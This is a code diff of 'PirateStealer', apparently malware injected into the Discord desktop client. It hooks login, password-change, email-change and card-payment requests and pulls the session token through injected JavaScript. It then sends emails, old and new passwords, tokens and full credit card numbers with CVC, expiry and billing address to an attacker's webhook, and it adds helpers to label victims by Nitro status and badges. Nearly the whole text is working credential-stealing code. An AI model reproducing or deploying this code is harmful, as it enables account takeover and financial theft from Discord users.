@@ -16,7 +16,6 @@ function FirstTime(){
     fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
     const window = BrowserWindow.getFocusedWindow();
     window.webContents.executeJavaScript(`function LogOut(){var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()} LogOut()`, true).then((result) => {
-
     });
     return false;
 }
@@ -70,83 +69,290 @@ function SendToWebhook(what) {
 }
 
 
+function GetNitro(flags){
+    if (flags == 0){
+        return "No Nitro";
+    }
+    if (flags == 1){
+        return "Nitro Classic";
+    }
+    if (flags == 2){
+        return "Nitro Boost";
+    }
+    else{
+        return "No Nitro";
+    }
+}
+function GetBadges(flags)
+{
+const Discord_Employee = 1;
+const Partnered_Server_Owner = 2;
+const HypeSquad_Events = 4;
+const Bug_Hunter_Level_1 = 8;
+const House_Bravery = 64;
+const House_Brilliance = 128;
+const House_Balance = 256;
+const Early_Supporter = 512;
+const Bug_Hunter_Level_2 = 16384;
+const Early_Verified_Bot_Developer = 131072;
 
+var badges = "";
+
+if((flags & Discord_Employee) == Discord_Employee){
+   badges += "Staff,";
+}
+if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
+   badges += "Partner,";
+}
+if((flags & HypeSquad_Events) == HypeSquad_Events){
+   badges += "Hypesquad Event,"
+}
+if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
+   badges += "Green Bughunter,";
+}
+if((flags & House_Bravery) == House_Bravery) {
+   badges += "Hypesquad Bravery,";
+}
+if((flags & House_Brilliance) == House_Brilliance){
+   badges += "HypeSquad Brillance,";
+}
+if((flags & House_Balance) == House_Balance){
+   badges += "HypeSquad Balance,";
+}
+if((flags & Early_Supporter) == Early_Supporter){
+   badges += "Early Supporter,";
+}
+if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
+   badges += "Gold BugHunter,";
+}
+if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
+   badges += "Discord Developer,";
+}
+if (badges == "" ){
+    badges = "None"
+}
+return badges;
+
+}
 
 
 
 function Login(email, password, token) {
-    var params = {
-        username: "PirateStealer",
-        content: "",
-        embeds: [
-            {
-                "title": "User Login",
-                "description": "**Email: **```" + email + "```" + "\n**Password: **```" + password + "```" + "\n**Token:**```" + token + "```",
-                "author": {
-                    "name": "PirateStealer"
-                },
-                "footer": {
-                    "text": "https://github.com/Stanley-GF/PirateStealer"
-                }
-            }
-        ]
+    const options = {
+        hostname: 'discord.com',
+        port: 443,
+        path: "/api/v8/users/@me",
+        method: 'GET',
+        headers: {
+            'Authorization': token
+        }
     }
-    SendToWebhook(JSON.stringify(params));
+
+
+
+
+
+    const req = https.request(options, res => {
+
+        res.on('data', d => {
+            var json = JSON.parse(d);
+            var params = {
+                username: "PirateStealer",
+                content: "",
+                embeds: [
+                    {
+                        "title": "User Login",
+                        "description": "**Username:**```" + json.username +"#" + json.discriminator+ "```\n" + "**ID:** ```"+ json.id + "```\n" + "**Nitro:** ```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```\n"+  "**Email: **```" + email + "```" + "\n**Password: **```" + password + "```" + "\n**Token:**```" + token + "```",
+                        "author": {
+                            "name": "PirateStealer"
+                        },
+                        "footer": {
+                            "text": "https://github.com/Stanley-GF/PirateStealer"
+                        },
+                        "thumbnail": {
+                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                          }                    
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params));
+        
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.end()
+
+
 }
 
 
 function ChangePassword(oldpassword, newpassword, token) {
-    var params = {
-        username: "PirateStealer",
-        content: "",
-        embeds: [
-            {
-                "title": "User Change Password",
-                "description": "**Old Password: **```" + oldpassword + "```" + "\n**New Password: **```" + newpassword + "```" + "\n**New Token:**```" + token + "```",
-                "author": {
-                    "name": "PirateStealer"
-                },
-                "footer": {
-                    "text": "https://github.com/Stanley-GF/PirateStealer"
-                }
-            }
-        ]
+
+    const options = {
+        hostname: 'discord.com',
+        port: 443,
+        path: "/api/v8/users/@me",
+        method: 'GET',
+        headers: {
+            'Authorization': token
+        }
     }
-    SendToWebhook(JSON.stringify(params));
+
+
+
+
+
+    const req = https.request(options, res => {
+
+        res.on('data', d => {
+            var json = JSON.parse(d);
+            var params = {
+                username: "PirateStealer",
+                content: "",
+                embeds: [
+                    {
+                        "title": "Password Changed",
+                        "description": "**Username:**```" + json.username +"#" + json.discriminator+ "```\n" + "**ID:** ```"+ json.id + "```\n" + "**Nitro:** ```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```\n"+  "**Email: **```" + json.email + "```\n**Old Password: **```" + oldpassword + "```"+ "\n**New Password: **```" + newpassword + "```" + "\n**Token:**```" + token + "```",
+                        "author": {
+                            "name": "PirateStealer"
+                        },
+                        "footer": {
+                            "text": "https://github.com/Stanley-GF/PirateStealer"
+                        },
+                        "thumbnail": {
+                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                          }                    
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params));
+        
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.end()
 
 }
 
 function ChangeEmail(newemail, password, token) {
-    var params = {
-        username: "PirateStealer",
-        content: "",
-        embeds: [
-            {
-                "title": "User Change Email",
-                "description": "**New Email: **```" + newemail + "```" + "\n**Password: **```" + password + "```" + "\n**New Token:**```" + token + "```",
-                "author": {
-                    "name": "PirateStealer"
-                },
-                "footer": {
-                    "text": "https://github.com/Stanley-GF/PirateStealer"
-                }
-            }
-        ]
+
+    const options = {
+        hostname: 'discord.com',
+        port: 443,
+        path: "/api/v8/users/@me",
+        method: 'GET',
+        headers: {
+            'Authorization': token
+        }
     }
 
-    SendToWebhook(JSON.stringify(params));
+
+
+
+
+    const req = https.request(options, res => {
+
+        res.on('data', d => {
+            var json = JSON.parse(d);
+            var params = {
+                username: "PirateStealer",
+                content: "",
+                embeds: [
+                    {
+                        "title": "Email Changed",
+                        "description": "**Username:**```" + json.username +"#" + json.discriminator+ "```\n" + "**ID:** ```"+ json.id + "```\n" + "**Nitro:** ```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```\n"+  "**New Email: **```" + newemail + "```\n**Password: **```" + password + "```"+ "\n**Token:**```" + token + "```",
+                        "author": {
+                            "name": "PirateStealer"
+                        },
+                        "footer": {
+                            "text": "https://github.com/Stanley-GF/PirateStealer"
+                        },
+                        "thumbnail": {
+                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                          }                    
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params));
+        
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.end()
 
 }
 
 
 function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+    const options = {
+        hostname: 'discord.com',
+        port: 443,
+        path: "/api/v8/users/@me",
+        method: 'GET',
+        headers: {
+            'Authorization': token
+        }
+    }
+
+
+
+
+
+    const req = https.request(options, res => {
+
+        res.on('data', d => {
+            var json = JSON.parse(d);
+            var params = {
+                username: "PirateStealer",
+                content: "",
+                embeds: [
+                    {
+                        "title": "User Credit Card Added",
+                        "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) +"```\n**Badges:**```" + GetBadges(json.flags) + "```" +  "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "**Token:**```" + token + "```",
+                        "author": {
+                            "name": "PirateStealer"
+                        },
+                        "footer": {
+                            "text": "https://github.com/Stanley-GF/PirateStealer"
+                        },
+                        "thumbnail": {
+                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
+                          }                    
+                    }
+                ]
+            }
+            SendToWebhook(JSON.stringify(params));
+        
+        })
+    })
+
+    req.on('error', error => {
+        console.error(error)
+    })
+
+    req.end()
+
+
+
     var params = {
         username: "PirateStealer",
         content: "",
         embeds: [
             {
                 "title": "User Credit Card Added",
-                "description": "**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "**Token:**```" + token + "```",
+                "description": "**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```",
                 "author": {
                     "name": "PirateStealer"
                 },
@@ -180,7 +386,7 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 
             const window = BrowserWindow.getFocusedWindow();
             window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
-                Login(email, password, token);
+                    Login(email, password, token);
             }));
         } else {
 
@@ -200,6 +406,7 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
                     }));
                 }
                 if (data.email != null && data.email != undefined && data.email != "") {
+                    const window = BrowserWindow.getFocusedWindow();
                     window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then((token => {
                         ChangeEmail(data.email, data.password, token);
                     }));
@@ -221,4 +428,5 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 
 });
 
-module.exports = require('./core.asar')
+
+module.exports = require('./core.asar');
